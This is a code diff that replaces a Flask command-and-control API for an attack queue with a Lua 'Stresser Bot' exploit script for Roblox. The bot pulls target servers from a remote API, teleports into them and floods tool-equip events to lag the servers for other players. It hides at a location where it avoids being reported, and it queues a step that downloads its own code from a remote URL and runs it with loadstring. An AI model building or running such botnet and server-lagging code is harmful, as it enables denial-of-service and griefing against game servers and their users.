+        local placeIdNum = tonumber(placeId)
+        if placeIdNum then
+            log("Initiating teleport to random server of place: " .. placeIdNum, "ATTACK")
+            TeleportService:Teleport(placeIdNum)
+        else
+            error("Invalid place ID: " .. tostring(placeId))
+        end
+    end)
+    
+    if success then
+        log("Server hop teleport initiated successfully", "ATTACK")
+    else
+        log("Server hop teleport failed: " .. tostring(result), "ERROR")
+        -- Don't immediately give up - let the retry mechanism handle it
+        if botState.teleportRetries >= botState.maxTeleportRetries then
+            log("Max teleport retries reached, cancelling server hop", "ERROR")
+            botState.status = "online"
+            botState.currentTarget = nil
+            botState.currentTaskId = nil
+            botState.teleportRetries = 0
+            botState.teleportStartTime = 0
+            botState.serverHopEnabled = false
+        end
+    end
+end
 
-@app.route('/api/stats', methods=['GET'])
-def get_stats():
-    try:
-        # Remove db_lock to prevent deadlocks, use timeout instead
-        conn = get_db_connection()
-        conn.execute('PRAGMA busy_timeout = 500')  # 500ms timeout
-        cursor = conn.cursor()
-        
-        cursor.execute("SELECT COUNT(*) FROM attacks WHERE status = 'pending'")
-        pending_attacks = cursor.fetchone()[0]
-        
-        cursor.execute("SELECT COUNT(*) FROM attacks WHERE status = 'assigned'")
-        active_attacks = cursor.fetchone()[0]
-        
-        cursor.execute("SELECT COUNT(*) FROM bots WHERE isOnline = 1")
-        online_bots = cursor.fetchone()[0]
-        
-        cursor.execute("SELECT COUNT(*) FROM attacks WHERE status = 'completed'")
-        completed_attacks = cursor.fetchone()[0]
-        
-        # Get total servers lagged count (sum of serversLagged from all completed attacks)
-        cursor.execute("SELECT COALESCE(SUM(serversLagged), 0) FROM attacks WHERE status = 'completed'")
-        servers_lagged = cursor.fetchone()[0]
-        
-        conn.close()
-        
-        return jsonify({
-            'status': 'online',
-            'pending_attacks': pending_attacks,
-            'active_attacks': active_attacks,
-            'online_bots': online_bots,
-            'completed_attacks': completed_attacks,
-            'servers_lagged': servers_lagged,
-            'config': CONFIG
-        })
-        
-    except Exception as e:
-        logger.error(f"Error getting stats: {str(e)}")
-        return jsonify({'error': 'Internal server error'}), 500
+-- Lag functionality based on lag.lua
+local function copyAvatar(username)
+    local maxAttempts = 3
+    local attempt = 1
+    while attempt <= maxAttempts do
+        local success, err = pcall(function()
+            local ReplicatedStorage = game:GetService("ReplicatedStorage")
+            local Event = ReplicatedStorage:FindFirstChild("EventInputModify")
+            if Event then
+                Event:FireServer(username)
+            else
+                error("EventInputModify not found")
+            end
+        end)
+        if success then
+            wait(1)
+            if player.Character and player.Character:FindFirstChild("Humanoid") then
+                return true
+            else
+                log("Avatar copied but character not updated on attempt " .. attempt, "WARN")
+            end
+        else
+            log("Failed to copy avatar for " .. username .. " on attempt " .. attempt .. ": " .. tostring(err), "ERROR")
+        end
+        attempt = attempt + 1
+        wait(1)
+    end
+    log("Failed to copy avatar for " .. username .. " after " .. maxAttempts .. " attempts", "ERROR")
+    return false
+end
 
-@app.route('/stop-attacks', methods=['POST'])
-def stop_attacks():
-    """Stop all active attacks immediately and reset stuck bots"""
-    try:
-        with db_lock:
-            conn = get_db_connection()
-            cursor = conn.cursor()
-            now = datetime.utcnow().isoformat()
-            
-            # Mark all assigned/active attacks as completed
-            cursor.execute('''
-                UPDATE attacks SET status = 'completed', completedAt = ? 
-                WHERE status IN ('assigned', 'pending')
-            ''', (now,))
-            stopped = cursor.rowcount
-            
-            # Mark all attacking bots as online, including teleporting ones
-            cursor.execute('''
-                UPDATE bots SET status = 'online' 
-                WHERE status IN ('attacking', 'lagging', 'teleporting', 'TELEPORTING', 'in_server')
-            ''')
-            bots_reset = cursor.rowcount
-            
-            conn.commit()
-            conn.close()
-        
-        logger.info(f"Stopped {stopped} attacks and reset {bots_reset} bots to online status")
-        return jsonify({
-            'success': True, 
-            'stopped': stopped, 
-            'bots_reset': bots_reset,
-            'message': 'All attacks stopped and bots reset'
-        })
-        
-    except Exception as e:
-        logger.error(f"Error stopping attacks: {str(e)}")
-        return jsonify({'error': 'Internal server error'}), 500
+local function removeTargetedItems(character)
+    if not character or not character.Parent then return end
+    local targetItemNames = {"aura", "fluffy satin gloves black", "fuzzy", "gloves", "satin"}
+    local removedCount = 0
+    
+    -- More aggressive removal - check all accessories and clothing
+    for _, item in ipairs(character:GetChildren()) do
+        if item:IsA("Accessory") or item:IsA("Hat") or item:IsA("Clothing") then
+            local itemName = item.Name:lower()
+            for _, targetName in ipairs(targetItemNames) do
+                if itemName:find(targetName, 1, true) then
+                    pcall(function() 
+                        item:Destroy() 
+                        removedCount = removedCount + 1
+                        log("Destroyed: " .. item.Name, "ATTACK")
+                    end)
+                    break
+                end
+            end
+        end
+    end
+    
+    -- Also check Humanoid for worn accessories
+    if character:FindFirstChild("Humanoid") then
+        local humanoid = character.Humanoid
+        for _, item in ipairs(humanoid:GetAccessories()) do
+            local itemName = item.Name:lower()
+            for _, targetName in ipairs(targetItemNames) do
+                if itemName:find(targetName, 1, true) then
+                    pcall(function() 
+                        humanoid:RemoveAccessory(item)
+                        item:Destroy()
+                        removedCount = removedCount + 1
+                        log("Removed accessory: " .. item.Name, "ATTACK")
+                    end)
+                    break
+                end
+            end
+        end
+    end
+    
+    log("Removed " .. removedCount .. " targeted items from character", "ATTACK")
+    return removedCount
+end
 
-@app.route('/api/clear-attacks', methods=['POST'])
-def clear_attacks():
-    try:
-        with db_lock:
-            conn = get_db_connection()
-            cursor = conn.cursor()
-            cursor.execute("DELETE FROM attacks WHERE status = 'pending'")
-            cleared = cursor.rowcount
-            conn.commit()
-            conn.close()
-        
-        logger.info(f"Cleared {cleared} pending attacks")
-        return jsonify({'success': True, 'cleared': cleared})
-        
-    except Exception as e:
-        logger.error(f"Error clearing attacks: {str(e)}")
-        return jsonify({'error': 'Internal server error'}), 500
+local function copyAvatarAndGetTools(username)
+    local success = copyAvatar(username)
+    if not success then
+        log("Proceeding with tool acquisition despite avatar copy failure for " .. username, "WARN")
+    end
 
-@app.route('/bot-sync', methods=['POST'])
-def bot_sync():
-    """Combined heartbeat and task retrieval endpoint - reduces API calls by 50%"""
-    try:
-        data = request.json
-        if not data:
-            return jsonify({'error': 'No data provided'}), 400
+    -- DON'T remove items here - they should already be removed in startLagging()
+
+    local tools = {
+        "DangerCarot",
+        "DangerBlowDryer",
+        "DangerPistol",
+        "FoodBloxi",
+        "DangerSpray",
+        "FoodPizza",
+        "FoodChocolate"
+    }
+    
+    spawn(function()
+        for _, toolName in ipairs(tools) do
+            pcall(function()
+                local ReplicatedStorage = game:GetService("ReplicatedStorage")
+                local toolEvent = ReplicatedStorage:FindFirstChild("Tool")
+                if toolEvent then
+                    toolEvent:FireServer(toolName)
+                end
+            end)
+            wait(0.1)
+        end
+    end)
+end
+
+local function toolCycleLoop()
+    spawn(function()
+        while botState.isLagging do
+            local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
+            local backpack = player.Backpack
             
-        bot_id = data.get('botId', 'unknown')
-        status = data.get('status', 'offline')
-        current_place = data.get('currentPlace')
-        current_job = data.get('currentJob')
-        attacks_executed = data.get('attacksExecuted', 0)
-        uptime = data.get('uptime', 0)
+            if humanoid and backpack then
+                for _, tool in pairs(backpack:GetChildren()) do
+                    if tool:IsA("Tool") and botState.isLagging then
+                        humanoid:EquipTool(tool)
+                        wait(CONFIG.TOOL_CYCLE_DELAY)
+                        humanoid:UnequipTools()
+                        wait(CONFIG.TOOL_CYCLE_DELAY)
+                    end
+                end
+            end
+            wait(0.01)
+        end
+    end)
+end
+
+-- No teleportation or TTS - just pure tool cycling for lag
+
+local function teleportToSafeLocation()
+    -- Teleport to safe location where bot won't be seen or reported
+    local safePosition = Vector3.new(718.295898, 910.449951, -181.603394)
+    local safeLocation = CFrame.new(safePosition) -- Simple position-only CFrame to avoid rotation issues
+    
+    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        pcall(function()
+            player.Character.HumanoidRootPart.CFrame = safeLocation
+            player.Character.HumanoidRootPart.Anchored = false -- Ensure not anchored
+            log("Teleported to safe location for lagging", "ATTACK")
+        end)
+    end
+end
+
+local function startLagging()
+    if botState.isLagging then return end
+    
+    botState.isLagging = true
+    botState.status = "lagging" -- Keep as lagging but still count as online
+    log("Starting lag attack for " .. botState.currentDuration .. " seconds", "ATTACK")
+    
+    -- FIRST: Teleport to safe location
+    teleportToSafeLocation()
+    wait(1)
+    
+    -- SECOND: Copy avatar and get tools for lagging
+    log("Copying avatar and getting tools...", "ATTACK")
+    copyAvatarAndGetTools("24k_mxtty1")
+    wait(2) -- Wait for avatar copy to complete and items to appear
+    
+    -- THIRD: Remove targeted items that appeared after avatar copy
+    if player.Character then
+        log("Removing targeted items that appeared after avatar copy...", "ATTACK")
+        local removedCount = removeTargetedItems(player.Character)
+        log("Removed " .. removedCount .. " items, waiting 2 seconds before starting lag...", "ATTACK")
+        wait(2) -- Wait for items to be fully removed
+    end
+    
+    -- Start tool cycling loop only (no teleportation or TTS)
+    log("Starting tool cycling lag...", "ATTACK")
+    toolCycleLoop()
+    
+    -- Set lag end time (this should only happen ONCE per attack)
+    botState.lagEndTime = tick() + botState.currentDuration
+    log("Lag will end at: " .. botState.lagEndTime .. " (duration: " .. botState.currentDuration .. "s)", "ATTACK")
+end
+
+local function stopLagging()
+    if not botState.isLagging then return end
+    
+    botState.isLagging = false
+    botState.lagEndTime = 0
+    
+    log("Lag attack completed", "ATTACK")
+    
+    -- Unequip tools
+    pcall(function()
+        for _, tool in pairs(player.Backpack:GetChildren()) do
+            tool:Destroy()
+        end
+    end)
+    
+    -- Check if server hopping is enabled
+    if botState.serverHopEnabled then
+        log("Server hop enabled - completing server hop", "ATTACK")
+        botState.status = "completed"
         
-        # Update bot status (heartbeat part)
-        update_bot_status(bot_id, status, current_place, current_job, attacks_executed, uptime)
+        -- Call server hop completion endpoint
+        local success = completeServerHop()
+        if success then
+            log("Server hop process initiated successfully", "ATTACK")
+            -- The completeServerHop function handles teleportation
+            return
+        else
+            log("Server hop failed, falling back to normal completion", "ERROR")
+        end
+    end
+    
+    -- Normal completion (no server hopping)
+    log("Normal attack completion - going idle", "ATTACK")
+    botState.status = "completed"
+    
+    -- Send completed status to API
+    syncWithAPI()
+    wait(2) -- Give API time to process the completed status
+    
+    -- Set to idle state after API processes completion
+    botState.status = "online"
+    botState.currentTarget = nil
+    botState.currentTaskId = nil
+    botState.joinTime = 0
+    
+    -- Send final online status
+    syncWithAPI()
+    
+    -- Clear status file to prevent restart loops
+    saveBotStatus("online")
+    
+    log("Attack marked as completed in API, bot now idle and ready for next attack", "ATTACK")
+end
+
+local function checkCurrentServer(target)
+    -- Check if we're already in the target server
+    local currentPlaceId = tostring(game.PlaceId)
+    local currentJobId = game.JobId
+    
+    if currentPlaceId == target.placeId and currentJobId == target.jobId then
+        log("Already in target server! Starting lag immediately", "ATTACK")
+        botState.currentTarget = target
+        botState.currentDuration = target.duration or 60
+        botState.currentTaskId = target.taskId
+        botState.serverHopEnabled = target.serverHop or false
+        botState.joinTime = tick()
+        startLagging()
+        return true
+    end
+    return false
+end
+
+local function executeAttack(target)
+    if not target then return end
+    
+    -- Check if we're already in the target server
+    if checkCurrentServer(target) then
+        return -- Already started lagging in current server
+    end
+    
+    botState.currentTarget = target
+    botState.currentDuration = target.duration or 60
+    botState.currentTaskId = target.taskId
+    botState.serverHopEnabled = target.serverHop or false
+    botState.status = "ATTACKING"
+    botState.joinTime = tick()
+    botState.teleportRetries = 0  -- Reset retry counter for new attack
+    botState.teleportStartTime = 0
+    
+    log("Executing attack on Place ID: " .. target.placeId, "ATTACK")
+    log("Job ID: " .. string.sub(target.jobId, 1, 12) .. "...")
+    log("Duration: " .. botState.currentDuration .. " seconds")
+    
+    -- Queue the script to re-execute after teleport
+    queueTeleport([[
+        -- Re-execute the stresser bot script
+        _G.StresserBotExecuted = nil
+        wait(3)
+        local success, script = pcall(function()
+            return game:HttpGet("]] .. CONFIG.SCRIPT_URL .. [[")
+        end)
+        if success and script and script ~= "" then
+            local loadSuccess, err = pcall(function()
+                loadstring(script)()
+            end)
+            if not loadSuccess then
+                warn("Script execution failed: " .. tostring(err))
+            end
+        else
+            warn("Failed to download bot script for re-execution")
+        end
+    ]])
+    
+    local success, result = pcall(function()
+        if target.jobId and target.jobId ~= "random" then
+            TeleportService:TeleportToPlaceInstance(tonumber(target.placeId), target.jobId)
+        else
+            -- For server hopping or when jobId is "random", teleport to random server
+            TeleportService:Teleport(tonumber(target.placeId))
+        end
+    end)
+    
+    if success then
+        botState.attacksExecuted = botState.attacksExecuted + 1
+        botState.status = "TELEPORTING"
+        botState.teleportStartTime = tick()
+        botState.teleportRetries = 1
+        log("Teleporting to target successfully!")
+        log("Total attacks executed: " .. botState.attacksExecuted)
+    else
+        log("Teleport failed: " .. tostring(result) .. " - Will retry", "ERROR")
+        botState.teleportRetries = 1
+        botState.teleportStartTime = tick()
+        -- Set status to teleporting so retry mechanism can handle it
+        botState.status = "TELEPORTING"
+    end
+end
+
+local function checkLagDuration()
+    -- Check if we need to stop lagging and go idle
+    if botState.isLagging and botState.lagEndTime > 0 then
+        local timeRemaining = botState.lagEndTime - tick()
         
-        # Handle completed attacks
-        if status == 'completed':
-            try:
-                conn = get_db_connection()
-                conn.execute('PRAGMA busy_timeout = 1000')
-                cursor = conn.cursor()
-                now = datetime.utcnow().isoformat()
-                
-                cursor.execute('SELECT id FROM attacks WHERE assignedBot = ? AND status = ?', (bot_id, 'assigned'))
-                attack = cursor.fetchone()
-                
-                if attack:
-                    cursor.execute('''
-                        UPDATE attacks SET status = 'completed', completedAt = ? 
-                        WHERE assignedBot = ? AND status = 'assigned'
-                    ''', (now, bot_id))
-                    updated = cursor.rowcount
-                    conn.commit()
-                    logger.info(f"Bot {bot_id} completed attack - Updated {updated} attack records")
-                else:
-                    logger.warning(f"Bot {bot_id} sent completed status but no assigned attack found")
-                
-                conn.close()
-            except Exception as e:
-                logger.error(f"Error marking attack completed: {str(e)}")
-                if 'conn' in locals():
-                    conn.close()
+        if console then
+            console.statusBar.Text = "LAGGING | TIME LEFT: " .. math.max(0, math.floor(timeRemaining)) .. "s"
+        end
         
-        # Task retrieval part (only if bot is online and not lagging)
-        task = None
-        if status == 'online':
-            cleanup_expired_attacks()
+        if timeRemaining <= 0 then
+            stopLagging() -- This now handles everything including API calls and status file
+        end
+    end
+    
+    -- NO RESTART LOGIC - lag should only start once per attack
+end
+
+-- Check if teleport is stuck and handle retries
+local function checkTeleportStatus()
+    if botState.status == "TELEPORTING" or botState.status == "teleporting" then
+        local timeInTeleport = tick() - botState.teleportStartTime
+        
+        -- If teleport has been running for more than timeout seconds
+        if timeInTeleport > botState.teleportTimeout then
+            log("Teleport timeout after " .. math.floor(timeInTeleport) .. " seconds", "ERROR")
             
-            try:
-                conn = get_db_connection()
-                conn.execute('PRAGMA busy_timeout = 1000')
-                cursor = conn.cursor()
+            -- Check if we can retry
+            if botState.teleportRetries < botState.maxTeleportRetries and botState.currentTarget then
+                log("Retrying teleport (" .. (botState.teleportRetries + 1) .. "/" .. botState.maxTeleportRetries .. ")", "ATTACK")
                 
-                # Check if bot already has an assigned task
-                cursor.execute('''
-                    SELECT * FROM attacks 
-                    WHERE assignedBot = ? AND status = 'assigned'
-                ''', (bot_id,))
-                existing_task = cursor.fetchone()
+                -- Reset teleport start time and try again
+                botState.teleportStartTime = tick()
+                botState.teleportRetries = botState.teleportRetries + 1
                 
-                if existing_task:
-                    task = {
-                        'taskId': existing_task[0],
-                        'type': 'join_game',
-                        'placeId': existing_task[1],
-                        'jobId': existing_task[2],
-                        'duration': existing_task[3]
-                    }
-                else:
-                    # Get next pending attack
-                    cursor.execute('''
-                        SELECT * FROM attacks 
-                        WHERE status = 'pending' 
-                        ORDER BY createdAt ASC 
-                        LIMIT 1
-                    ''')
-                    attack = cursor.fetchone()
-                    
-                    if attack:
-                        attack_id = attack[0]
-                        now = datetime.utcnow().isoformat()
-                        
-                        # Mark attack as assigned to this bot
-                        cursor.execute('''
-                            UPDATE attacks SET status = 'assigned', assignedAt = ?, assignedBot = ?
-                            WHERE id = ?
-                        ''', (now, bot_id, attack_id))
-                        
-                        conn.commit()
-                        
-                        # Update bot status to attacking
-                        update_bot_status(bot_id, 'attacking', attack[1], attack[2])
-                        
-                        logger.info(f"Attack {attack_id} assigned to bot {bot_id} - Target: {attack[1]} Duration: {attack[3]}s")
-                        
-                        task = {
-                            'taskId': attack_id,
-                            'type': 'join_game',
-                            'placeId': attack[1],
-                            'jobId': attack[2],
-                            'duration': attack[3]
-                        }
+                -- Try teleporting again
+                local success, result = pcall(function()
+                    if botState.currentTarget.jobId and botState.currentTarget.jobId ~= "random" then
+                        TeleportService:TeleportToPlaceInstance(tonumber(botState.currentTarget.placeId), botState.currentTarget.jobId)
+                    else
+                        TeleportService:Teleport(tonumber(botState.currentTarget.placeId))
+                    end
+                end)
                 
-                conn.close()
-            except Exception as e:
-                logger.error(f"Error getting task for bot {bot_id}: {str(e)}")
-                if 'conn' in locals():
-                    conn.close()
-        
-        return jsonify({
-            'success': True, 
-            'message': 'Sync completed',
-            'task': task
-        })
-        
-    except Exception as e:
-        logger.error(f"Error in bot sync: {str(e)}")
-        return jsonify({'error': 'Internal server error'}), 500
+                if not success then
+                    log("Teleport retry failed: " .. tostring(result), "ERROR")
+                end
+            else
+                log("Max teleport retries reached or no target - resetting to online", "ERROR")
+                botState.status = "online"
+                botState.currentTarget = nil
+                botState.currentTaskId = nil
+                botState.teleportRetries = 0
+                botState.teleportStartTime = 0
+                -- Sync the reset status
+                syncWithAPI()
+            end
+        end
+    end
+end
 
-@app.route('/health', methods=['GET'])
-def health():
-    return get_stats()
+-- Main loop - combines heartbeat and task polling into single API call
+local function mainLoop()
+    while botState.isActive do
+        -- Always check teleport status first
+        checkTeleportStatus()
+        
+        if botState.status == "online" then
+            -- Sync with API - sends heartbeat and gets new task if available
+            local target = syncWithAPI()
+            if target then
+                executeAttack(target)
+            else
+                log("No targets available, waiting...")
+            end
+        elseif botState.status == "lagging" then
+            -- Only check lag duration when lagging, don't sync with API
+            checkLagDuration()
+        elseif botState.status == "attacking" or botState.status == "teleporting" or botState.status == "TELEPORTING" then
+            -- Just sync status, don't look for new tasks
+            -- Only sync every 10 seconds to avoid spam when teleporting
+            if tick() - botState.lastStatusSync > 10 then
+                syncWithAPI()
+                botState.lastStatusSync = tick()
+            end
+        else
+            -- For other statuses (completed, etc), sync and check lag duration
+            syncWithAPI()
+            checkLagDuration()
+        end
+        
+        wait(CONFIG.HEARTBEAT_INTERVAL) -- Now 5 seconds for everything
+    end
+end
 
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(
-        debug=CONFIG['DEBUG'], 
-        port=port,
-        host='0.0.0.0'  # Allow external connections for deployment
-    )
+local function statusUpdateLoop()
+    while console.screenGui.Parent do
+        if botState.isActive then
+            local uptime = math.floor(tick() - botState.startTime)
+            local minutes = math.floor(uptime / 60)
+            local seconds = uptime % 60
+            
+            if not botState.shouldLeave and botState.status ~= "IN_SERVER" then
+                local statusLine = "Uptime: " .. minutes .. "m " .. seconds .. "s | Attacks: " .. botState.attacksExecuted
+                console.header.Text = "STRESSER BOT | " .. statusLine
+                console.statusBar.Text = "STATUS: " .. botState.status
+            end
+            
+            -- Update status bar color based on status
+            if botState.status == "ONLINE" then
+                console.statusBar.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+                console.statusBar.TextColor3 = Color3.fromRGB(255, 255, 255)
+            elseif botState.status == "ATTACKING" or botState.status == "IN_SERVER" then
+                console.statusBar.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
+                console.statusBar.TextColor3 = Color3.fromRGB(255, 255, 255)
+            elseif botState.status == "ERROR" then
+                console.statusBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+                console.statusBar.TextColor3 = Color3.fromRGB(255, 255, 255)
+            end
+        end
+        wait(1)
+    end
+end
+
+-- Auto-start function
+local function startBot()
+    if botState.isActive then return end
+    
+    botState.isActive = true
+    botState.status = "online"
+    botState.startTime = tick()
+    
+    log("Bot started successfully", "SYSTEM")
+    
+    -- Start single main loop (combines heartbeat + task polling)
+    spawn(mainLoop)
+    
+    -- Check if we're in a target server (after teleport)
+    if botState.currentTarget and botState.joinTime > 0 then
+        botState.status = "in_server"
+        log("Resumed in target server", "ATTACK")
+    end
+end
+
+-- Check if we were teleported here by another instance
+local function checkIfInTargetServer()
+    -- Try to read bot status from file
+    local success, statusData = pcall(function()
+        local statusFile = createBotFolder()
+        return readfile(statusFile)
+    end)
+    
+    if success and statusData ~= "" then
+        local data = HttpService:JSONDecode(statusData)
+        if data and data.botId == CONFIG.BOT_ID then
+            log("Found previous bot session data: " .. data.status, "SYSTEM")
+            botState.attacksExecuted = data.attacksExecuted or 0
+            
+            -- ONLY restart if status is ATTACKING, not COMPLETED or ONLINE
+            if tostring(game.PlaceId) ~= "0" and data.status == "ATTACKING" then
+                log("Detected teleport to target server", "ATTACK")
+                botState.status = "IN_SERVER"
+                botState.joinTime = tick()
+                botState.currentDuration = 60 -- Default, will be updated from server
+                return true
+            elseif data.status == "COMPLETED" or data.status == "ONLINE" then
+                log("Bot was already completed/idle, not restarting attack", "SYSTEM")
+                botState.status = "ONLINE"
+                return false
+            end
+        end
+    end
+    return false
+end
+
+-- Initialize
+console = createConsole()
+
+log("Advanced Stresser Bot v3.0", "SYSTEM")
+log("Initializing cloud-hosted bot...")
+log("Bot ID: " .. CONFIG.BOT_ID)
+
+-- Check if we're in a target server first
+local inTargetServer = checkIfInTargetServer()
+
+-- Test connection and auto-start
+spawn(function()
+    wait(2)
+    log("Testing API connection...")
+    
+    local success, response = makeRequest("/health", "GET")
+    
+    if success and response.Success then
+        log("API connection successful", "SYSTEM")
+        if CONFIG.AUTO_START then
+            wait(1)
+            startBot()
+            
+            if inTargetServer then
+                log("Resuming attack in target server", "ATTACK")
+            end
+        else
+            log("Manual start mode - execute _G.StresserBot.start() to begin")
+        end
+    else
+        log("Cannot connect to API", "ERROR")
+        log("Check your internet connection")
+    end
+end)
+
+-- Start status update loop
+spawn(statusUpdateLoop)
+
+log("Bot ready - Waiting for API connection...")
+
+-- Expose functions for manual control
+_G.StresserBot = {
+    start = startBot,
+    stop = function()
+        if botState.isActive then
+            botState.isActive = false
+            botState.status = "OFFLINE"
+            botState.currentTarget = nil
+            botState.currentTaskId = nil
+            botState.teleportRetries = 0
+            botState.teleportStartTime = 0
+            botState.isLagging = false
+            botState.lagEndTime = 0
+            log("Bot stopped manually", "SYSTEM")
+            saveBotStatus("OFFLINE")
+        end
+    end,
+    reset = function()
+        log("Resetting bot status to recover from stuck state", "SYSTEM")
+        botState.status = "online"
+        botState.currentTarget = nil
+        botState.currentTaskId = nil
+        botState.teleportRetries = 0
+        botState.teleportStartTime = 0
+        botState.isLagging = false
+        botState.lagEndTime = 0
+        saveBotStatus("online")
+        syncWithAPI()
+    end,
+    status = function()
+        return botState
+    end,
+    config = CONFIG
+}
